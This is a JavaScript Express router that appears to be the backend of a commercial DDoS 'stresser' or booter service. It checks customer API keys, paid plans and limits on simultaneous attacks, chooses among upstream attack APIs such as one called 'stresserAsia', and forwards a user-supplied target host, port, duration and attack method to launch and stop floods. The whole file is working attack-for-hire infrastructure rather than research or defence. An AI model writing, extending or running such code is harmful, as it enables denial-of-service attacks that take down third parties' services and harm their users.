const express = require('express');
const router = express.Router();
const User = require('../models/User');
const Attack = require('../models/Attack');
const ApiAttack = require('../models/apiAttack');
const apiConfig = require('../config/apiConfig');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const methods = require('../methods.json');

const authenticateApiKey = async(apiKey) => {
    const user = await User.findOne({ apiToken: apiKey });
    if (!user || !user.activePlan) {
        return null;
    }
    return user;
};

const hasConcurrentsAvailable = async(userId, apiName, maxConcurrents) => {
    const activeAttacks = await Attack.countDocuments({ userId, api: apiName });
    return activeAttacks < maxConcurrents;
};

const startAttackInAPI = async(apiDetails, attackParams) => {
    try {
        console.log(`Sending attack to API ${apiDetails.name}:`, attackParams);

        const response = await axios.get(`${apiDetails.baseUrl}${apiDetails.startPath}`, {
            params: apiDetails.params.start(attackParams)
        });

        console.log(`Response from API ${apiDetails.name}:`, response.data);

        if (response.data.Status === 'Success' || response.data.status === 'true') {
            return {
                success: true,
                attackId: apiDetails.name === 'stresserAsia' ? response.data.stopper : null
            };
        } else {
            return { success: false, message: response.data.message || `Invalid response from ${apiDetails.name}` };
        }
    } catch (error) {
        console.error(`Error starting attack in ${apiDetails.name}:`, error.message);
        return { success: false, message: error.message };
    }
};

const stopAttack = async(attack) => {
    try {
        const apiDetails = apiConfig[attack.api];
        if (!apiDetails) throw new Error(`API configuration for ${attack.api} not found`);

        if (apiDetails.stopBy === 'ip') {
            await axios.get(`${apiDetails.baseUrl}${apiDetails.stopPath}`, {
                params: apiDetails.params.stop({
                    api_key: apiDetails.api_key,
                    address: attack.ip,
                    port: attack.port,
                    time: attack.time
                })
            });
        } else if (apiDetails.stopBy === 'id') {
            await axios.get(`${apiDetails.baseUrl}${apiDetails.stopPath}`, {
                params: apiDetails.params.stop({
                    api_key: apiDetails.api_key,
                    attackId: attack.attackId
                })
            });
        }

        return { success: true };
    } catch (error) {
        if (error.response && error.response.status === 429) {
            console.log(`Rate limit reached for stopping attack with ID ${attack.id}, waiting before retry...`);
            await new Promise(resolve => setTimeout(resolve, 5000));
            return stopAttack(attack);
        }

        console.error(`Error stopping attack with ID ${attack.id}:`, error.message);
        return { success: false, message: error.message };
    }
};

const selectAPIForAttack = async(user, methodInfo) => {
    const apis = methodInfo.apis;
    for (let i = 0; i < apis.length; i++) {
        const apiName = apis[i].name;
        const apiDetails = apiConfig[apiName];

        const apiHasConcurrents = await hasConcurrentsAvailable(user._id, apiName, apiDetails.maxConcurrents);
        if (apiHasConcurrents) {
            return apiDetails;
        }
    }
    return null;
};

router.get('/start', async(req, res) => {
    const { key, host, port, time, method } = req.query;

    if (!key || !host || !time || !method) {
        return res.status(400).json({ message: 'Missing required parameters.' });
    }

    try {
        const user = await authenticateApiKey(key);
        if (!user) {
            return res.status(403).json({ message: 'Invalid API key or no active plan.' });
        }

        const activeUserConcurrents = await Attack.countDocuments({ userId: user._id });
        if (activeUserConcurrents >= user.concurrents) {
            return res.status(400).json({ message: 'You have reached your maximum concurrents limit.' });
        }

        const methodInfo = methods.find(m => m.methodName === method);
        if (!methodInfo) {
            return res.status(400).json({ message: 'Invalid method selected.' });
        }

        const apiDetails = await selectAPIForAttack(user, methodInfo);
        if (!apiDetails) {
            return res.status(500).json({ message: 'No available slots for the selected method and API.' });
        }

        const attackParams = {
            api_key: apiDetails.api_key,
            address: host,
            port: port || 80,
            duration: time,
            methodApiName: method
        };

        const result = await startAttackInAPI(apiDetails, attackParams);
        if (result.success) {
            const attackId = uuidv4();

            await ApiAttack.create({
                id: attackId,
                api: apiDetails.name,
                ip: host,
                port: port || 80,
                method: method,
                time,
                startTime: new Date(),
                userId: user._id,
                attackId: result.attackId
            });

            await Attack.create({
                id: attackId,
                api: apiDetails.name,
                ip: host,
                port: port || 80,
                method: method,
                time,
                startTime: new Date(),
                userId: user._id,
                attackId: result.attackId
            });

            return res.status(200).json({ message: 'Attack started successfully.', attackId });
        } else {
            return res.status(500).json({ message: `Failed to start attack. Error: ${result.message}` });
        }
    } catch (error) {
        console.error('Error:', error.message);
        return res.status(500).json({ message: `Server error: ${error.message}` });
    }
});

router.get('/stop', async(req, res) => {
    const { key, attackID } = req.query;

    if (!key || !attackID) {
        return res.status(400).json({ message: 'Missing required parameters.' });
    }

    try {
        const user = await authenticateApiKey(key);
        if (!user) {
            return res.status(403).json({ message: 'Invalid API key or no active plan.' });
        }

        const attack = await ApiAttack.findOne({ id: attackID, userId: user._id });
        if (!attack) {
            return res.status(404).json({ message: 'Attack not found.' });
        }

        const result = await stopAttack(attack);
        if (result.success) {
            await ApiAttack.deleteOne({ _id: attack._id });
            await Attack.deleteOne({ id: attackID });
            return res.status(200).json({ message: 'Attack stopped successfully.' });
        } else {
            return res.status(500).json({ message: `Failed to stop attack. Error: ${result.message}` });
        }
    } catch (error) {
        console.error('Error stopping attack:', error.message);
        return res.status(500).json({ message: `Server error while stopping attack: ${error.message}` });
    }
});

module.exports = router;